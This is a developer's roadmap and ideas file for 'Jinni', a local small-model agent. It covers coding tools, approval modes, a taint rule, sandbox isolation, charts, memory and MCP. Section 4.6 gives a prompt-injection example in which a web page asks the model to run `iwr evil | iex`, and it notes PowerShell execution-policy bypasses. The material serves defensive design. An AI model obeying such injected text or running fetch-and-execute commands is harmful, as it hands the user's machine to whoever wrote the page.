# Jinni: ideas, roadmap and known gaps

_Last updated: 2026-10-25 · last stable tag: `v0.17-stable`_

This file is the parking lot. An idea written down here is saved; building it can wait.
When an idea gets built, tick its box and move on. When a new idea shows up mid-step, it
goes **here**, not into the code.

**Legend**

- **Size:** S = an evening · M = a few sessions · L = a project of its own
- **Risk:** low / medium / high. This is risk to stability or safety, not difficulty.
- `(your pick)` = chosen by you · `(designed)` = already designed in chat, ready to become a step
- `- [ ]` open · `- [x]` done

---

## 1. Rules of the road (the drift guard)

1. **One feature per step, on its own git branch.** `main` always works, and every finished step gets a tag.
2. **Green before, green after.** `pytest` passes before you start and before you merge.
3. **New features plug in at the edges** (the `tools/` folder, the memory store, `config.py`). If a step seems to need changes inside the agent loop, stop and ask whether the design is wrong.
4. **Fail soft.** If a feature is off or broken, Jinni behaves exactly as it did before.
5. **Every step has a "Not in this step" list.** New ideas go in this file.
6. **Done means** tests green plus the "Try it" checklist passes. No polish loops.
7. **Safety defaults live in code.** The human may loosen only what the code allows.
8. **Measure, don't guess.** Search backends, similarity thresholds, PNG sizes and speed were all settled by measuring.
9. **The model never gets to** enable modes, add MCP servers, launch programs, or open files by itself.

Rollback: `git checkout v0.17-stable`. If a step goes sideways, `git switch main` abandons the branch.

---

## 2. Where we are (shipped)

**Foundation (steps 1 to 12):** streaming chat loop · native tool calling · agent loop with a step cap ·
context compaction and summarizing · sandboxed workspace with an approval gate · thinking display ·
modules + `class Agent` + typed `Settings` · pytest · logging and retries · async with parallel tools ·
plugin tools (`@tool`) and web search · per-domain approval · SQLite memory (facts + events) with an exit review.

| Tag | What shipped |
|---|---|
| `v0.12-stable` | Bar and line charts, `/open` |
| `v0.13-stable` | Compact axis labels, "typed by Jinni" provenance flag |
| `v0.14-stable` | Embedding recall (hybrid keyword + meaning search) |
| `v0.15-stable` | MCP client (supervisor-owned connections, allowlist, fail-soft) |
| `v0.16-stable` | Multi-series and pie charts |
| `v0.17-stable` | PNG export via headless Edge/Chrome, `/open` guard for non-genuine pages |

---

## 3. Suggested order

Flexible, but this is the order I would build in. Riskiest last.

1. **C1: coding read side** (ranged reads, grep, find, outline). No writes, no execution.
2. **C2: safe edits** (diff-before-write, atomic patches, syntax check, git checkpoints, `/undo`, audit log).
3. **E1: eval harness**, with a small coding task suite, so later steps are decisions and not hopes.
4. **P1: Auto-edit mode** (see section 5). Autonomy comes *after* the safety net.
5. **Step 17: charts from web data with real provenance** (`fetch_table` plus sidecar records).
6. **Isolation decision**, then **C4: `run_tests`** inside it, then **C5: free-form PowerShell**, off by default and only inside isolation.
7. **Memory conflicts and pruning** (your pick).
8. **Expose Jinni's tools as an MCP server**, then **charts fed by an MCP data server** (your picks).

---

## 4. Coding agent track

**Constraint to design around:** a 4B model with a 16k context cannot hold much code. The strategy is
tools that return *small, precise slices* (line ranges, grep hits, symbol outlines), plus the context
compaction we already have. Every tool also costs context and makes tool selection harder for a small
model, so add tools in small groups and measure.

### 4.1 The tier ladder

| Tier | What | Risk | Notes |
|---|---|---|---|
| **A. Inspect** | grep, find, ranged reads, outlines, read-only git | low | No code runs |
| **B. Edit** | atomic patches, diff-before-write, syntax check, git checkpoints | low | Reversible |
| **C. Run project code** | tests, scripts | medium to high | Real code execution: `pytest` imports whatever the model wrote |
| **D. Free-form PowerShell** | anything | highest | Only inside isolation |

Approval alone is not enough for tiers C and D, because you cannot review code you haven't read.
The real answer is **isolation**.

### 4.2 Tier A: read side (C1)

- [x] **Ranged `read_file`** with line numbers (`start`, `end`). Today it is capped at 4000 characters. _[S / low]_
- [x] **`search_files`** (grep): text or regex across the project, returning `file:line: snippet`, capped. _[S / low]_
- [x] **`find_files`** (glob). _[S / low]_
- [x] **Code outline**: functions and classes per file via Python's `ast`, so Jinni can navigate without reading whole files. _[S / low]_
- [x] **Project tree** tool with depth and size limits. _[S / low]_

### 4.3 Tier B: edit side (C2)

- [x] **Diff before write** for `write_file` and `edit_file`: show what changes, and warn when a file already exists. _[S / low]_
- [x] **`apply_patch`**: several exact replacements, all-or-nothing, validated before anything is written. _[M / low]_
- [x] **Syntax check after edit** (`ast.parse` for Python): the tool result says "syntax error on line 12" so the model can self-correct. _[S / low]_
- [x] **Git checkpoints**: before each approved write, commit a snapshot. `/undo` restores it. _[M / medium]_
  - Git can be configured to run programs (hooks and some config options), so this is only safe in repos **we create**. A copied-in repo gets its `.git` stripped.
- [x] **Safe delete**: no real delete. Move files to a `.trash/` folder. _[S / low]_
- [x] **Audit log** of every approved call, with a `/audit` viewer. Auto-approved calls are marked as such. _[S / low]_

### 4.4 Project model

- [x] **Per-project folders:** `workspace/projects/<name>/`, git-initialized, selected with `/project <name>`. Tools are confined to the active project. _[M / medium]_
- [x] **Real repos get copied in**, never edited in place, so originals are untouched. _[S / low]_
- [x] **`JINNI.md` per project:** conventions, test command and so on, loaded at the start (like an `AGENTS.md`). _[S / low]_

### 4.5 Verification without execution

- [x] **`py_compile`**, **ruff** and **pyright** runs. These analyze code without running it. _[S / low]_

### 4.6 Tier C and D: running things

- [x] **`run_tests`**: fixed pytest command, project-scoped paths, scrubbed environment, timeout, output cap, and no-network AppContainer isolation. _[M / high]_
- [x] **Free-form PowerShell**: project-scoped, approved, no-network AppContainer execution; disabled by default with `powershell_enabled`. _[M / high]_
- [ ] **No `pip install`** on the host. Installs run arbitrary setup code, so inside isolation only.

**Why a shell is different from every other tool:** all our protections look at a path or a URL, and a
command string cannot be inspected that way (`cd ..`, absolute paths, chaining, aliases, building commands
at run time). Locking PowerShell down from the inside does not help either:

- Constrained Language Mode is designed to be enforced through application control (WDAC or AppLocker). The environment-variable route is for testing only and is not a security boundary.
- Execution policy is a safety feature, not a security boundary (`-ExecutionPolicy Bypass` or piping to `Invoke-Expression` defeats it).
- Add a small model that reads web pages, and prompt injection ("run `iwr evil | iex`") makes the approval prompt the only thing between that text and the machine.

**Isolation options (verified):**

- **Windows Sandbox:** disposable and hypervisor-isolated. Requires Windows 11 Pro, Enterprise, Pro Education/SE or Education. **Not available on Home.** Needs hardware virtualization enabled.
  - Configured with a `.wsb` file: networking can be disabled, folders can be mapped read-only or read-write, and everything is wiped when it closes.
  - Defaults are permissive: networking and clipboard sharing are on unless turned off.
  - One sandbox at a time. A `wsb` command line with `exec` is mentioned in one guide, so verify on your build before designing around it.
- **WSL2 / Docker / a VM:** the alternatives on Home. Not researched yet.
- Check your edition: `(Get-CimInstance Win32_OperatingSystem).Caption`

### 4.7 Most "ps commands" do not need a shell

| You would type | Use instead |
|---|---|
| `ls` / `Get-ChildItem` | `list_files`, plus the new `find_files` |
| `cat` / `Get-Content` | `read_file` with line ranges |
| `Select-String` | `search_files` |
| `git status/diff/log` | read-only git tools |
| `pytest` | `run_tests` (tier C, isolated) |
| `pip install` | not offered on the host |
| `Remove-Item` | no delete; move to `.trash/` |
| `iwr` / `curl` | `fetch_url`, which already has our protections |
| `New-Item` | `write_file` |
| `cd` | not needed; the working folder is pinned |

### 4.8 Agent behavior for longer tasks

- [x] **`ask_user` tool:** the model asks a clarifying question instead of guessing. _[S / low]_
- [x] **"Keep going? (y/n)" at the step limit** instead of stopping at 8 laps. _[S / low]_
- [x] **Task-list tool** so the model tracks multi-step work. _[S / low]_
- [x] **Fresh context per subtask**, to cope with 16k. _[M / medium]_
- [x] **Tool groups:** load the coding tools only when a project is active, to keep the menu small. _[M / medium]_

### 4.9 Coding eval suite (E1)

- [x] 5 to 10 tiny tasks in scratch repos ("fix this failing test", "rename this function everywhere") with automatic pass/fail. Used to compare thinking on/off, model versions, and tool-menu sizes. _[M / low]_ (five bounded scratch tasks; static checks only, generated code is not executed)

---

## 5. Permissions and safety

### 5.1 Full Access mode (your idea, designed)

**Key distinction:** there are two kinds of protection.

- **Approval prompts** are a human gate ("may I?"). These are what Full Access skips.
- **Enforcement walls** are code: `safe_path`, the private-address check, the same-site redirect rule, the MCP allowlist, no delete tool, timeouts and size caps. These **stay on, always.**

**Modes** (a middle mode fixes most of the annoyance at far lower risk):

| Mode | Skips approval for | Still asks for |
|---|---|---|
| **Ask** (default) | nothing | everything risky |
| **Auto-edit** | writes and edits inside the current project (git checkpoints make them reversible) | web, MCP, commands |
| **Full Access** | everything the project's tier allows, **while the session is untainted** | free-form commands unless isolated; everything once tainted |

**The taint rule:** once untrusted content has entered the conversation, approvals switch back on
automatically. Sources of taint: `fetch_url`, `web_search`, any MCP tool, and `recall` (remembered notes may
come from sessions that contained web text). A fresh conversation clears it. Open question: should reading
files copied in from outside also taint?

**Safeguards for the mode itself:**

- [ ] Only the user can enable it, with a CLI command the model never sees. The warning text comes from our code, not the model.
- [ ] **Typed confirmation** ("FULL ACCESS"), not y/n.
- [ ] Session only. Never persisted, and exiting reverts it.
- [ ] Always-visible prompt marker: `you [FULL ACCESS] >`.
- [ ] A budget: expires after N tool calls or 30 minutes, then asks again.
- [ ] `/safe` reverts instantly, and the first Ctrl+C reverts it too.
- [ ] Scoped to the active project, and built only after checkpoints and `/undo` exist.
- [ ] Every auto-approved call is marked "auto" in the audit log.
- [ ] A config switch (`allow_full_access = False`) that removes the feature entirely.
- [ ] A pure **policy function** (tool, mode, project, taint → allow / ask / deny), used by `authorize()`, tested with a full decision table (see Appendix B).

Open question: would **Auto-edit alone** solve the annoyance? If the real pain is web or command prompts, a smaller
fix may do: remember a domain, a quieter prompt, or batched approvals.

### 5.2 Approval and prompt improvements

- [x] **Truncate or summarize tool arguments** in approval prompts. A long file currently floods the terminal. _[S / low]_
- [x] **`write_file` overwrites silently**; show "file exists" and a diff (see 4.3). _[S / low]_
- [x] **`/allowed` persistence with review:** per-domain permissions that survive restarts, only if they stay visible and revocable. Never persist trust you cannot see. _[M / medium]_
- [x] **Only fetch URLs that appeared in a search result or were given by the user.** The model guessed deep links. _[S / medium]_
- [x] **Public-suffix-aware domain approval** (today approvals are per exact hostname, minus a leading `www.`). _[M / low]_

### 5.3 Hardening of existing tools

- [x] **DNS rebinding gap in `fetch_url`:** we check the address, then the HTTP client looks it up again. Close it by connecting to the checked IP. _[M / medium]_
- [x] **Download size cap for `fetch_url`:** stream with a limit instead of reading the whole response. _[S / low]_
- [x] **Warn when one fetch result eats a lot of context** (digit-heavy text costs roughly one token per character). _[S / low]_
- [x] **Secrets scrubbing in `jinni.log`:** it holds conversations, file snippets and 200-character tool-result previews. _[S / low]_
- [x] **A "genuine page" record** (hash) instead of exact-match regeneration. _[S / low]_

---

## 6. Charts and data

### 6.1 Chart features still open

- [x] **Stacked bars**, **donut charts**, **secondary y-axis**. _[M / low]_
- [x] **A verified colorblind-safe palette** (colors were chosen by eye; contrast was not measured). _[S / low]_
- [x] **Bar value labels:** switch to compact form (`1.45B`) when bars are narrow. _[S / low]_
- [x] Charts from **Excel files**. _[M / low]_

### 6.2 Export extras (after PNG)

- [x] `/png dark` and custom sizes per command. _[S / low]_
- [x] **SVG export** and **PDF export** (`--print-to-pdf`). _[S / low]_
- [x] **Export all charts** at once. _[S / low]_
- [x] Wait for the whole browser process tree to exit on Windows (timeouts can leave stray `msedge.exe`). _[S / low]_
- [ ] Headless flag escape hatch exists (`png_headless_flag`); revisit if browsers change flags.

### 6.3 Charts from web or search data (your pick, designed as Step 17)

**Problem:** in the population test the model *typed* the numbers into a CSV itself. The chart was faithful to
that CSV, which was only as trustworthy as the model's memory. Labeling it "unverified" is not a fix.

**Design:**

- [x] **`fetch_table(url, table_index)`**: *our code* extracts an HTML table into a CSV in the workspace, so the model never types numbers. Reuses `fetch_url`'s safety rules (private-address check, redirects, per-domain approval). _[M / medium]_
- [x] **Sidecar provenance record** saved to disk: source URL, fetch time, hash of the data. Charts print `Source: <url>, fetched <date>` in the subtitle. _[M / medium]_
- [x] **Persist the "typed by Jinni" flag across restarts** (the in-memory flag forgets everything). Folded into the sidecar. _[S / low]_
- [x] **Charts from search results** (extract numbers from snippets): much weaker than tables; probably skip. _[M / high]_ (explicit numeric candidates only; CSV and chart provenance retain source links and flag values as unverified)

### 6.4 Charts fed by an MCP data server (your pick)

- [x] A bridge that lands MCP data in a workspace CSV **with a source label**, the same mechanism as `fetch_table`. _[M / high]_
- [x] A tiny **local data server** built together, which doubles as the test fixture for exposing Jinni as a server (6.x MCP section).
- **Open question:** what data do you want an MCP server to feed charts? A database you query, a folder of CSVs, a public API, or something else?

---

## 7. Memory

### 7.1 Your picks

- [x] **Conflict handling for contradicting facts** (`Likes tea.` vs `Likes coffee.`): detect with similarity, then ask the user at review time. _[M / medium]_ (your pick)
- [x] **Pruning old memory events:** events currently pile up forever. A `/prune` command and an age or count cap. _[M / medium]_ (your pick)

### 7.2 More memory ideas

- [x] **Memory provenance:** remember which session each memory came from and show it in `/memory`. _[S / low]_
- [x] **Near-duplicate detection** using embedding similarity (beyond exact-text duplicates). _[M / medium]_
- [x] **Exit review for forgetting:** propose stale facts for deletion. _[S / low]_
- [x] **`/memory` search and filters.** _[S / low]_
- [x] **Facts-in-prompt budget:** currently capped at 20 facts of 200 characters. Revisit if it matters. _[S / low]_

---

## 8. Semantic search and RAG

- [x] **Calibrate `min_similarity`** with `bench_embed.py` (the 0.512 default is based on the initial pair set). Record the related-vs-unrelated scores. _[S / low]_
- [x] **Circuit breaker:** stop retrying the embedding server for a minute after a failure. _[S / low]_
- [ ] **RAG over workspace files:** needs chunking and a design for what "relevant" means. _[L / medium]_
- [x] **`sqlite-vec` or similar**, only if memory ever reaches tens of thousands of items. _[M / low]_ (deferred: the current store has one record, below the stated trigger)
- [x] **Reranking pass.** _[M / medium]_
- [x] **Jinni starts and stops the embedding server itself** (process management; belongs with MCP-style supervision). _[M / medium]_
- [x] **Per-model prefix configs** for other embedding models. _[S / low]_
- [x] The first `recall` after a long backlog embeds up to 640 memories; `/reindex` pre-warms it. Consider a startup warm-up. _[S / low]_

---

## 9. MCP

**Notes from the build:** the current SDK is v2 (`pip install "mcp>=2,<3"`); `FastMCP` became `MCPServer`; every
connection is owned by one long-lived task (otherwise closing it from another task crashes); servers are an
**allowlist** (the `ddgs mcp` server exposes `extract_content`, which fetches URLs and would bypass all of our
`fetch_url` protections, so it must stay off). For *search specifically*, the plugin is the better choice (it gave
us backend and region control). MCP earns its keep with servers that are not Python or not yours.

### 9.1 Client improvements

- [ ] **MCP over HTTP** (and OAuth) for remote servers. _[L / high]_
- [x] **MCP resources and prompts**, not just tools. _[M / medium]_
- [x] **Servers that ask the client questions** (elicitation, sampling). _[M / high]_
- [x] **Auto-restart with backoff** when a server dies. _[M / medium]_
- [x] **Validate tool arguments against the server's schema** before calling. _[M / low]_
- [x] **Read server definitions from a JSON file** instead of `config.py`. _[S / low]_
- [ ] Check whether a console Ctrl+C reaches MCP child processes on Windows (result from the live test is still pending).
- [ ] `mode="legacy"` pin per server exists as an escape hatch; revisit if older servers misbehave.

### 9.2 Expose Jinni as an MCP server (your pick)

- [x] Expose a **read-only allowlist** of tools (`list_files`, `read_file`, `recall`, ...) over stdio. There is **no terminal approval prompt** in that setting, so nothing that writes, fetches or deletes. _[M / medium]_ (your pick)
- [x] A tiny local data server (see 6.4) as the shared test fixture.

---

## 10. Measurement and models

- [x] **Eval harness:** scripted prompts with expected tool calls, run against thinking on/off, Qwen3 vs Qwen3.5, and different menu sizes, printing a results table. _[M / low]_ (strongly recommended: it turns every "I think it's better" into a number)
- [x] **`/stats`:** tokens, seconds per lap and tool counts per session, built from data we already log. _[S / low]_
- [x] **Session replay:** record a session as JSONL, then replay it against a new model or prompt to catch regressions. _[M / low]_
- [x] **System-prompt A/B tests**, after the eval harness. _[S / low]_
- [x] **Experiments:** 16k vs 32k context, tool-menu size vs tool-choice quality, thinking on/off per task type. _[S / low]_
- [ ] **Fine-tuning tone and tool calling.** The dataset would come from your own approved transcripts (scrubbed first), and the eval harness decides whether it helped. Unknown: whether 6 GB of VRAM is enough to train even a 4B. Research first. _[L / medium]_
- [ ] **Voice** (speech in and out). Fun, but a project of its own. _[L / high drift risk]_

---

## 11. CLI comfort

- [x] **`/save` and `/load` transcripts** (today only memory survives, not the conversation). _[S / low]_
- [x] **`/undo`** (drop the last turn), **`/help`**, **`/config`** (show effective settings). _[S / low]_
- [x] **Up-arrow input history.** Python's `readline` is not on Windows, so this costs a dependency. _[S / medium]_
- [x] **Tasks/notes tool:** a SQLite to-do list the model can add to, with due items shown at startup. _[S / low]_
- [x] **Workspace search** ("ask questions across my own files"), reusing the embedding server. Needs a chunking decision. _[M / medium]_

---

## 12. Engineering

- [x] **Events instead of prints:** the agent emits events and the CLI decides how to show them. Makes the agent testable without capturing stdout, and is the doorway to a UI later (frontend parked: "heavy"). _[M / medium]_
- [x] **Type-check and lint:** pyright and ruff on the core modules, plus a pre-commit hook. _[S / low]_
- [x] **Packaging:** `pyproject.toml` so `jinni` becomes a real command, with settings in a TOML file instead of editing `config.py`. _[S / low]_
- [x] **CI:** GitHub Actions running `pytest` on every push. _[S / low]_
- [x] **Dependency pins:** a lock file (`pip freeze`), and note that `mcp` is pinned `>=2,<3`. `httpx` is pinned directly because the app imports it. _[S / low]_
- [x] **Replace broad `except Exception`** with specific handlers where the failure is understood. _[S / low]_
- [x] **Log tool tracebacks** inside the tools' own `except` blocks (swallowed errors made a past typo hard to find). _[S / low]_
- [ ] **Keep `RUNNING.md` current** (see Appendix C).

---

## 13. Known gaps (honest list)

Things that work but have a known weakness.

- **The agent still calls `print()` and `input()` directly**, so it is not fully separate from the CLI.
- **Cancelling a turn drops the whole turn**, including tool effects that already happened (a written file stays written, but Jinni forgets writing it).
- **A running tool thread cannot be killed on cancel;** a fetch finishes in the background (max about 10 s).
- **Per-domain approval uses exact hostnames,** so `docs.example.com` and `example.com` are separate approvals.
- **Redirects across sites cost an extra lap** (error, then a second fetch).
- **`ddgs` is unofficial scraping:** expect occasional empty results or errors. If it breaks for good, only `search.py` changes. Official search APIs with keys exist; their current free-tier terms were not verified.
- **The 4B may skip `remember`** or over-call `recall`; the exit review is the safety net.
- **Keyword + meaning search only helps if the model calls `recall`;** use `/recall` to test the search itself.
- **Memory is only saved on a clean exit.** A crash or closing the terminal loses the session on purpose (nothing unreviewed is saved).
- **`memory.db` and `jinni.log` are plain files with personal data** (both gitignored; keep it that way).
- **Chart colors and tooltips were not tested for every color-vision type.**
- **The tool menu grows with every tool and MCP server,** and small models get worse at choosing as it grows.
- **PNG export depends on browser flags that can change,** and on Windows the screenshot size may be clamped (the real size is read from the file and printed).
- **Charts made before Step 16b are "not genuine" to the current generator,** so `/open` asks once. Regenerate to silence it.

---

## 14. Explicitly not doing (for now)

- **`run_python` or any model-written code execution on the host.** Needs real isolation first.
- **A delete tool.** Never give a 4B model delete powers.
- **`--no-sandbox` for the browser.** It switches off the browser's main protection for no benefit on a desktop.
- **Letting the model add MCP servers,** enable modes, or trigger `/open` and `/png`.
- **Persisting "always allow"** without a way to review and revoke it.
- **Allowlisting `extract_content` from `ddgs mcp`** (it bypasses our fetch protections), or `search_books`.
- **Locking PowerShell down from the inside** and calling it a sandbox. It is not one.

---

## 15. Open questions

1. **Windows edition?** (`(Get-CimInstance Win32_OperatingSystem).Caption`). Decides the isolation path: Windows Sandbox needs Pro or above.
2. **The three PowerShell commands you would most want Jinni to run?** Most map to structured tools (see 4.7).
3. **Which languages besides Python?** Changes which verification tools are worth building.
4. **MCP data source for charts:** database, folder of CSVs, public API, or something else?
5. **Does Auto-edit alone solve the approval annoyance,** or do you want web and command approvals gone too?
6. **Part 2 of your picks:** not sent yet. It will be folded into section 3.
7. **Results still owed:** the Ctrl+C-versus-MCP-server test.

---

## Appendix A: Full Access warning (draft text)

```
FULL ACCESS skips every approval prompt for this session.

Jinni will be able to, without asking:
  - write and edit files in the current project
  - search the web and fetch pages
It will STILL be blocked from:
  - anything outside the project folder
  - private network addresses
  - MCP tools you did not allowlist
  - deleting files

The risk: web pages, search results and files can hide instructions
that a small model may follow. If untrusted content enters the
conversation, approvals switch back on automatically.

Type FULL ACCESS to continue. Anything else cancels.
```

The warning lists what stays blocked as well as what opens up, because that is what makes it believable.

---

## Appendix B: policy decision table (draft, finalize when built)

| Situation | Ask | Auto-edit | Full Access |
|---|---|---|---|
| Write/edit inside the active project, clean session | ask | allow (checkpointed) | allow |
| Write/edit, tainted session | ask | ask | ask |
| Write outside the project | deny | deny | deny |
| `web_search` / `fetch_url`, clean session | ask (remember per tool or domain) | ask | allow |
| Any MCP tool | ask | ask | ask, unless on the tool's `remember` list |
| Free-form commands | ask | ask | ask, unless isolated |
| Delete | no tool | no tool | no tool |
| Changing the mode | user only | user only | user only |

Tests to write with it: a tainted session never auto-approves a write; free-form commands never auto-approve
outside isolation; `/safe` always returns to asking; the model can never change the mode.

---

## Appendix C: RUNNING.md (keep in the project root)

```markdown
# Running Jinni
1. Chat server:   llama-server -m C:\models\<your-model>.gguf -c 16384 -ngl 99 --jinja --port 8080
2. Embeddings:    llama-server -m C:\models\nomic-embed-text-v1.5.Q8_0.gguf --embedding --pooling mean -c 2048 -ub 2048 -np 1 -ngl 0 --port 8081 --host 127.0.0.1
3. Jinni:         venv\Scripts\activate ; python jinni.py
Tests:            pytest
Last good state:  git checkout v0.17-stable
Parked ideas:     IDEAS.md
```

Notes: use `127.0.0.1`, not `localhost` (it avoided a ~2 s IPv6 delay on Windows). Thinking is off by default for
Qwen3.5 small models (`/think` toggles it per session).
